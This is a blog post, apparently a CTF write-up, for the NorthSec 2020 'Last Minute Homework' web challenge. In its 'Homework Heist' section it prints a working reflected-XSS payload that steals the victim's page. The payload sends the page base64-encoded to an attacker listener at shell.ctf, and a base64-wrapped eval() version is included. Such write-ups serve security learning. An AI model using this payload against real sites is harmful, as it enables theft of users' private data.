<!DOCTYPE html>
<html lang="en-us">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<meta name="theme-color" content="#494f5c">
	<meta name="msapplication-TileColor" content="#494f5c">
<meta itemprop="name" content="Last Minute Homework - nsec 2020 CTF">
<meta itemprop="description" content="Another fun web challenge from the NorthSec 2020 CTF which I tackled with some friends from dc902.
Intro A Severity High student&rsquo;s homework is going to be late if we don&rsquo;t help them steal the smart kid&rsquo;s assignment which has already been submitted to the online homework submission site at homeworks.ctf.
Additionally, the student tells us that they have managed to install some malware on the smart kid&rsquo;s machine (hosted at homeworks-malware.">
<meta itemprop="datePublished" content="2020-05-18T00:00:00+00:00" />
<meta itemprop="dateModified" content="2020-05-18T00:00:00+00:00" />
<meta itemprop="wordCount" content="554">



<meta itemprop="keywords" content="ctf,XSS,nsec," />
<meta property="og:title" content="Last Minute Homework - nsec 2020 CTF" />
<meta property="og:description" content="Another fun web challenge from the NorthSec 2020 CTF which I tackled with some friends from dc902.
Intro A Severity High student&rsquo;s homework is going to be late if we don&rsquo;t help them steal the smart kid&rsquo;s assignment which has already been submitted to the online homework submission site at homeworks.ctf.
Additionally, the student tells us that they have managed to install some malware on the smart kid&rsquo;s machine (hosted at homeworks-malware." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://stargravy.ca/posts/last-minute-homework/" />
<meta property="article:published_time" content="2020-05-18T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-05-18T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Last Minute Homework - nsec 2020 CTF"/>
<meta name="twitter:description" content="Another fun web challenge from the NorthSec 2020 CTF which I tackled with some friends from dc902.
Intro A Severity High student&rsquo;s homework is going to be late if we don&rsquo;t help them steal the smart kid&rsquo;s assignment which has already been submitted to the online homework submission site at homeworks.ctf.
Additionally, the student tells us that they have managed to install some malware on the smart kid&rsquo;s machine (hosted at homeworks-malware."/>

	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
	<link rel="manifest" href="/site.webmanifest">
	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
	<link rel="shortcut icon" href="/favicon.ico">

	<title>Last Minute Homework - nsec 2020 CTF</title>
	<link rel="stylesheet" href="https://stargravy.ca/css/style.min.e67c2ade9e24620997494a5f35506f6bea3fb8dbbabaf8d3c9b1550ac394f855.css" integrity="sha256-5nwq3p4kYgmXSUpfNVBva+o/uNu6uvjTybFVCsOU+FU=" crossorigin="anonymous">
	
</head>

<body id="page">
	
	<header id="site-header" class="animated faster">
		<div class="hdr-wrapper section-inner">
			<div class="hdr-left">
				<div class="site-branding">
					<a href="https://stargravy.ca">stargravy</a>
				</div>
				<nav class="site-nav hide-in-mobile">
					

				</nav>
			</div>
			<div class="hdr-right hdr-icons">
				<span class="hdr-social hide-in-mobile"><a href="https://twitter.com/stargravy" target="_blank" rel="noopener me" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://github.com/stargravy" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
			</div>
		</div>
	</header>
	<div id="mobile-menu" class="animated fast">
		<ul>
		</ul>
	</div>


	<main class="site-main section-inner animated fadeIn faster">
		<article class="thin">
			<header class="post-header">
				<div class="post-meta"><span>May 18, 2020</span></div>
				<h1>Last Minute Homework - nsec 2020 CTF</h1>
			</header>
			<div class="content">
				<p><em>Another fun web challenge from the <a href="https://nsec.io/">NorthSec 2020</a> CTF which I tackled with some friends from <a href="https://www.dc902.ca/">dc902</a>.</em></p>
<h2 id="intro">Intro<a href="#intro" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>A Severity High student&rsquo;s homework is going to be late if we don&rsquo;t help them steal the smart kid&rsquo;s assignment which has already been submitted to the online homework submission site at <code>homeworks.ctf</code>.</p>
<p>Additionally, the student tells us that they have managed to install some malware on the smart kid&rsquo;s machine (hosted at <code>homeworks-malware.ctf</code>) which we could leverage in our homework heist.</p>
<h2 id="the-application">The Application<a href="#the-application" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>Looking quickly at <code>homeworks.ctf</code> show a fairly limited page consisting of:</p>
<ul>
<li>A file upload functionality for uploading our homework.</li>
<li>An about page which explains that individuals are authenticated to the application by their IP.</li>
<li>A <code>check</code> page which gives us a personal &ldquo;secret link&rdquo; to our homework submission.</li>
</ul>
<figure>
    <img src="/last-minute-homework-1.png"
         alt="homework check"/> <figcaption>
            <p>The homework check page, showing our &ldquo;secret link&rdquo;</p>
        </figcaption>
</figure>

<p>The malware mentioned in the forum post is reachable at <code>homworks-malware.ctf</code> and consists of a simple form which lets us make requests to the <code>homeworks.ctf</code> site <em>as</em> the smart kid&rsquo;s browser.</p>
<h2 id="homework-heist">Homework Heist<a href="#homework-heist" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>We initially thought we were going to have to find a way to point these browser requests to the attacker machine at <code>shell.ctf</code>, to gather their IP address, and use X-Forwarded-For headers, or other means, to appear authenticated as the smart kid. This path didn&rsquo;t pan out.</p>
<p>We continued to investigate and found a reflected cross-site scripting (XSS) vulnerability which could be triggered via the page&rsquo;s url/path.
There is a very limited attempt at filtering this sort of attack, as the first set of <code>&lt;&gt;</code> characters, but that is circumvented. Additionally, using any unencoded <code>/</code> characters results in a 404.</p>
<p>For example, the legitimate homework check page sits at:</p>
<pre><code>http://homeworks.ctf/check/Severity High
</code></pre><p>A reflected XSS payload can be triggered with the following request:</p>
<pre><code>http://homeworks.ctf/check/Severity High&lt;&gt;&lt;img src=x onerror=alert(1)&gt;
</code></pre><p>With this XSS we can execute code in the context of the smart kid victim&rsquo;s browser using the provided malware. 
We know that the homework can be found via the personalized &ldquo;secret link&rdquo; from the /check page, so we have to construct a payload which can collect that information and send it to a listener on our attacker machine at <code>shell.ctf</code>.</p>
<p>The payload we want to trigger against the smart kid&rsquo;s browser is:</p>
<pre><code>var text = btoa(document.documentElement.innerHTML); 
req = new XMLHttpRequest();
req.open(&quot;GET&quot;,&quot;http://shell.ctf:8000/&quot;+text);
req.send();
</code></pre><p>This will save the entirety of the /check page (base64 encoded) into a variable, and use it as the path in a request the attacker web server at <code>shell.ctf</code>, which will allow us to intercept the smart kid&rsquo;s &ldquo;secret link&rdquo; and grab his homework.</p>
<p>To make this more manageable to send, the payload is base64 encoded and passed via <code>eval()</code>, making the final reflected XSS link payload:</p>
<pre><code>http://homeworks.ctf/homeworks/check/Severity High&lt;&gt;&lt;img src=x onerror=eval(atob(&quot;dmFyIHRleHQ9YnRvYShkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MKTsgcmVxID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7cmVxLm9wZW4oIkdFVCIsImh0dHA6Ly9zaGVsbC5jdGY6ODAwMC8iK3RleHQpO3JlcS5zZW5kKCk7&quot;))&gt;
</code></pre><p>We can enter this as our input to the malware at <code>homeworks-malware.ctf</code>, triggering the XSS and sending a request with the info we need to a listener waiting on <code>shell.ctf</code>.</p>
<figure>
    <img src="/last-minute-homework-2.png"
         alt="malware"/> <figcaption>
            <p>Triggering our payload via the malware.</p>
        </figcaption>
</figure>

<figure>
    <img src="/last-minute-homework-3.png"
         alt="catching secrets"/> <figcaption>
            <p>Catching the base64 encoded document on <code>shell.ctf</code></p>
        </figcaption>
</figure>

<p>Decoding the request received gives us the smart kid&rsquo;s personalized &ldquo;secret link&rdquo; to his homework submission. Visiting the link yields both the homework, and our flag.</p>
<figure>
    <img src="/last-minute-homework-4.png"
         alt="homework"/> <figcaption>
            <p>Capturing our flag.</p>
        </figcaption>
</figure>

<hr>
<p>Further reading:</p>
<ul>
<li>Check out <a href="https://nsec.io">NorthSec</a>. Many thanks to them for the fun CTF.</li>
<li>PortSwigger has a good page on exploiting XSS to steal information, including a couple of labs : <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">https://portswigger.net/web-security/cross-site-scripting/exploiting</a></li>
</ul>

			</div>
			<hr class="post-end">
			<footer class="post-info">
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather"><path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"></path><line x1="16" y1="8" x2="2" y2="22"></line><line x1="17.5" y1="15" x2="9" y2="15"></line></svg>stargravy</p>
				<p>
					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://stargravy.ca/tags/ctf">ctf</a></span><span class="tag"><a href="https://stargravy.ca/tags/xss">XSS</a></span><span class="tag"><a href="https://stargravy.ca/tags/nsec">nsec</a></span>
				</p>
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>554 Words</p>
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-05-17 21:00 -0300</p>
			</footer>
		</article>
		<aside id="toc" class="show-toc">
			<div class="toc-title">Table of Contents</div>
			<nav id="TableOfContents">
  <ul>
    <li><a href="#intro">Intro</a></li>
    <li><a href="#the-application">The Application</a></li>
    <li><a href="#homework-heist">Homework Heist</a></li>
  </ul>
</nav>
		</aside>
		<div class="post-nav thin">
			<a class="next-post" href="https://stargravy.ca/posts/failing-revenge/">
				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;Newer</span><br><span>Failing Revenge - nsec 2020 CTF</span>
			</a>
		</div>
		<div id="comments" class="thin">
</div>
	</main>

	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
		<p><a href="https://stargravy.ca">stargravy</a></p>
		<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-167180735-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script');
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' :
        'http://www') + '.google-analytics.com/ga.js';
    ga.setAttribute('async', 'true');
    document.documentElement.firstChild.appendChild(ga);
  })();

</script>
	</footer>



	<script src="https://stargravy.ca/js/bundle.min.a636e150f73fcd4b6bd77ea4e8401f9f828e156ea8309e6f8918e50e5b68091a.js" integrity="sha256-pjbhUPc/zUtr136k6EAfn4KOFW6oMJ5viRjlDltoCRo=" crossorigin="anonymous"></script>
	

</body>

</html>
